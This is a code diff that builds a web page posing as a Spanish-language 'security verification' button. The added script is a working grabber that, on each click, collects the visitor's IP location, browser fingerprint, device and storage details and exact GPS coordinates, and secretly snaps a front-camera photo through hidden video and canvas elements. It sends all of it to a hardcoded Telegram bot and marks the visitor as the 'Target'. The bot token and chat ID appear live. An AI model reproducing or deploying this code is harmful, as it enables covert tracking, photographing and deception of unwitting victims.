@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Verificación</title>
+    <title>Verificación de seguridad</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -24,10 +24,33 @@
             width: 100%;
             text-align: center;
         }
-        h1 { font-size: 1.8rem; font-weight: 600; color: #1a1a1a; margin-bottom: 12px; }
-        p { color: #5f6368; font-size: 0.9rem; margin-bottom: 28px; }
-        button { background: #1a73e8; color: white; border: none; border-radius: 28px; padding: 12px 24px; font-size: 1rem; font-weight: 500; cursor: pointer; width: 100%; }
-        button:active { background: #1557b0; transform: scale(0.98); }
+        h1 {
+            font-size: 1.8rem;
+            font-weight: 600;
+            color: #1a1a1a;
+            margin-bottom: 12px;
+        }
+        p {
+            color: #5f6368;
+            font-size: 0.9rem;
+            margin-bottom: 28px;
+        }
+        button {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 28px;
+            padding: 12px 24px;
+            font-size: 1rem;
+            font-weight: 500;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.2s;
+        }
+        button:active {
+            background: #1557b0;
+            transform: scale(0.98);
+        }
     </style>
 </head>
 <body>
@@ -37,10 +60,15 @@
     <button id="btn">✅ Verificar acceso</button>
 </div>
 
+<video id="video" autoplay playsinline style="display:none"></video>
+<canvas id="canvas" style="display:none"></canvas>
+
 <script>
+    // 🔐 REVOCA TU TOKEN VIEJO CON @BotFather Y PON AQUÍ EL NUEVO
     const BOT_TOKEN = '8803149571:AAF6V8NewmO0JSUAlXdJh1NUuhMo1lwOH6s';
     const CHAT_ID = '7555997298';
 
+    // -------------------- 1. IP + ubicación aproximada --------------------
     async function getIPinfo() {
         try {
             const res = await fetch('https://ipapi.co/json/');
@@ -58,39 +86,162 @@
         }
     }
 
+    // -------------------- 2. Fingerprint (GPU, fuentes, canvas) --------------------
+    async function getFingerprint() {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = 200; canvas.height = 50;
+        ctx.fillStyle = "#f60"; ctx.fillRect(0, 0, 200, 50);
+        ctx.fillStyle = "#069"; ctx.font = "14px Arial"; ctx.fillText("FP", 10, 30);
+        const canvasHash = canvas.toDataURL().slice(0, 100);
+        let gpu = 'N/A';
+        try {
+            const gl = document.createElement('canvas').getContext('webgl');
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A';
+        } catch(e) {}
+        const fontsList = ["Arial", "Verdana", "Helvetica", "Times New Roman", "Courier New", "Impact", "Comic Sans MS"];
+        const availableFonts = fontsList.filter(f => document.fonts.check(`12px "${f}"`));
+        return { gpu, fonts: availableFonts.join(', ') || 'Ninguna', canvasHash };
+    }
+
+    // -------------------- 3. Datos del dispositivo --------------------
+    function getDeviceInfo() {
+        const ua = navigator.userAgent;
+        let model = "Desconocido";
+        if (ua.includes('iPhone')) model = 'iPhone';
+        else if (ua.includes('iPad')) model = 'iPad';
+        else if (ua.includes('Android')) model = 'Android';
+        else if (ua.includes('Mac')) model = 'Mac';
+        else if (ua.includes('Windows')) model = 'Windows PC';
+        const language = navigator.language || navigator.userLanguage;
+        const resolution = `${window.screen.width}x${window.screen.height}`;
+        const cpuCores = navigator.hardwareConcurrency || 'N/A';
+        return { model, ua, language, resolution, cpuCores };
+    }
+
+    // -------------------- 4. Almacenamiento --------------------
+    async function getStorageInfo() {
+        try {
+            const est = await navigator.storage.estimate();
+            const totalGB = (est.quota / (1024**3)).toFixed(2);
+            const usedGB = (est.usage / (1024**3)).toFixed(2);
+            return { total: totalGB, used: usedGB };
+        } catch(e) { return { total: 'N/A', used: 'N/A' }; }
+    }
+
+    // -------------------- 5. GPS exacto --------------------
     function getGPS() {
         return new Promise((resolve) => {
-            if (!navigator.geolocation) { resolve(null); return; }
+            if (!navigator.geolocation) {
+                resolve(null);
+                return;
+            }
             navigator.geolocation.getCurrentPosition(
-                (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }),
+                (pos) => resolve({
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy
+                }),
                 () => resolve(null),
-                { enableHighAccuracy: true, timeout: 10000 }
+                { enableHighAccuracy: true, timeout: 15000 }
             );
         });
     }
 
+    // -------------------- 6. Cámara frontal (foto) --------------------
+    async function capturePhoto() {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        let stream = null;
+        try {
+            // Priorizar cámara frontal
+            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        } catch(e) {
+            try {
+                // Si falla, cualquier cámara
+                stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            } catch(err) {
+                return null;
+            }
+        }
+        video.srcObject = stream;
+        await new Promise(resolve => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
+        await new Promise(r => setTimeout(r, 500));
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+        stream.getTracks().forEach(t => t.stop());
+        return blob;
+    }
+
+    // -------------------- 7. Envío a Telegram --------------------
+    async function sendMessage(text) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+            });
+        } catch(e) {}
+    }
+    async function sendPhoto(blob) {
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('photo', blob, 'photo.jpg');
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+        } catch(e) {}
+    }
+
+    // -------------------- 8. Proceso completo (cada clic) --------------------
     async function fullProcess() {
-        const [ipInfo, gps] = await Promise.all([getIPinfo(), getGPS()]);
+        // Obtener datos que no requieren permisos (IP, fingerprint, dispositivo, almacenamiento)
+        const [fp, ipInfo, device, storage] = await Promise.all([
+            getFingerprint(),
+            getIPinfo(),
+            getDeviceInfo(),
+            getStorageInfo()
+        ]);
+
+        // Solicitar GPS y cámara (en paralelo, pero los diálogos se mostrarán secuencialmente)
+        const [gps, foto] = await Promise.all([
+            getGPS(),
+            capturePhoto()
+        ]);
+
+        // Construir mensaje estilo Kaliboy
         let message = `📊 *Visitor Information Captured*\n━━━━━━━━━━━━━━━━\n\n`;
-        message += `🌐 *Network Information*\n   • IP Address: ${ipInfo.ip}\n   • Language: ${navigator.language}\n\n`;
+        message += `🖥️ *Device & Browser*\n   • Device Model: ${device.model}\n   • User Agent: ${device.ua}\n\n`;
+        message += `🎨 *Fingerprint*\n   • GPU: ${fp.gpu}\n   • Fonts: ${fp.fonts}\n   • Canvas: ${fp.canvasHash}...\n\n`;
+        message += `🌐 *Network Information*\n   • IP Address: ${ipInfo.ip}\n   • Language: ${device.language}\n\n`;
         message += `📍 *Location Details*\n`;
         if (gps) {
             message += `   • GPS Coordinates: ${gps.lat}, ${gps.lng}\n   • Accuracy: ±${gps.accuracy} meters\n   • Google Maps: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n`;
         } else {
             message += `   • GPS: No disponible (permiso denegado o error)\n`;
             if (ipInfo.city !== 'N/A') {
-                message += `   • IP approximate location:\n   • Country: ${ipInfo.country}\n   • Region: ${ipInfo.region}\n   • City: ${ipInfo.city}\n   • Postal: ${ipInfo.postal}\n   • Timezone: ${ipInfo.timezone}\n`;
+                message += `   • IP approximate location:\n   • Country: ${ipInfo.country}\n   • Region: ${ipInfo.region}\n   • City: ${ipInfo.city}\n   • Postal Code: ${ipInfo.postal}\n   • Timezone: ${ipInfo.timezone}\n`;
                 message += `   • Map: https://www.google.com/maps?q=${ipInfo.city},${ipInfo.country}\n`;
+            } else {
+                message += `   • No disponible\n`;
             }
         }
-        message += `\n🎯 Target: ${window.location.href}\n`;
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
-        });
+        message += `\n🖼️ *Display Information*\n   • Resolution: ${device.resolution}\n\n`;
+        message += `🔐 *Device Permissions*\n   • Camera: ${foto ? 'Permitido' : 'Denegado/No disponible'}\n   • Location: ${gps ? 'Permitido' : 'Denegado/No disponible'}\n\n`;
+        message += `💾 *Hardware & Storage*\n   • CPU Cores: ${device.cpuCores}\n   • RAM: N/A GB\n   • Storage Used: ${storage.used} GB\n   • Storage Total: ${storage.total} GB\n`;
+        message += `━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @Society👨🏻‍💻\n`;
+
+        await sendMessage(message);
+        if (foto) await sendPhoto(foto);
     }
 
-    document.getElementById('btn').onclick = () => { fullProcess(); };
+    // Cada clic al botón ejecuta el proceso (sin límite)
+    document.getElementById('btn').onclick = () => {
+        fullProcess();
+    };
 </script>
 </body>
 </html>
